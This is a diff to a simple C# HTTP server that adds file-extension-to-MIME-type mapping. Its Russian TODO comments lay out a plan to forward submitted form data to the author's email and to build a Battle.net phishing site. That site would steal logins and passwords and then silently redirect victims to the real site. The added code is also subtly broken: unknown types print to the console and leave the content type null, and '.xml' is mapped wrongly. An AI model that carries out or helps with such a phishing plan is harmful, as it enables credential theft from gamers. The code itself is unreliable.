@@ -8,6 +8,22 @@ namespace HttpServer
 {
     public class Server
     {
+        private static Dictionary<string, string> mimeTypeMapping  = new Dictionary<string, string>()
+                {
+                    { ".html", "text/html; charset=utf-8" },
+                    { ".css", "text/css" },
+                    { ".js", "application/javascript" },
+                    { ".jpg", "image/jpeg" },
+                    { ".jpeg", "image/jpeg" },
+                    { ".png", "image/png" },
+                    { ".gif", "image/gif" },
+                    { ".svg", "image/svg+xml" },
+                    { ".mp3", "audio/mpeg" },
+                    { ".wav", "audio/wav"},
+                    { ".mp4", "video/mp4"},
+                    { ".avi", "video/x-msvideo" },
+                    { ".xml", "application/xml"}
+                };
         private HttpListener _server;
         private readonly Config _config;
 
@@ -55,7 +71,11 @@ namespace HttpServer
 
                 if (File.Exists(filePath))
                 {
-                    string contentType = GetContentType(filePath);
+                    string contentType;
+                    if (!mimeTypeMapping.TryGetValue(Path.GetExtension(filePath).ToLowerInvariant(), out contentType))
+                    {
+                        Console.WriteLine("application/octet-stream");
+                    }
                     ServeFile(context, filePath, contentType);
                 }
                 else
@@ -83,15 +103,25 @@ namespace HttpServer
                     case ".gif":
                         return "image/" + extension.Substring(1);
                     case ".svg":
-                        return "image/svg+xml";
+                        return "image/svg+xml"; 
+                    case ".mp3":
+                        return "audio/mpeg";
+                    case ".wav":
+                        return "audio/wav";
+                    case ".mp4":
+                        return "video/mp4";
+                    case ".avi":
+                        return "video/x-msvideo";
+                    case ".xml":
                     default:
-                        return "application/octet-stream"; // Добавить музыку и видео и xml
-                        // сделать через dictionary где key расширение файла, а value contenttype(типо image/)
+                        return "application/octet-stream"; // Добавить музыку и видео и xml -OK
+                        // сделать через dictionary где key расширение файла, а value contenttype(типо image/) - OK
                         // MSDN
+                        //
                         //хаха-лох логин и пароль
                         // узнать smpt почты и порт для отправки
 
-                        // 1) переделать contenttype в dictionary
+                        // 1) переделать contenttype в dictionary - OK
                         // 2) при отпраке формы на страницу ../sendmail/ отправить данные на свою почту
                         // 3) сделать фишинговый сайт по buttlenet чтобы пиздить данные логи и пароля но автоматически редиректить и авторизировать на официальном battlenet
                 }
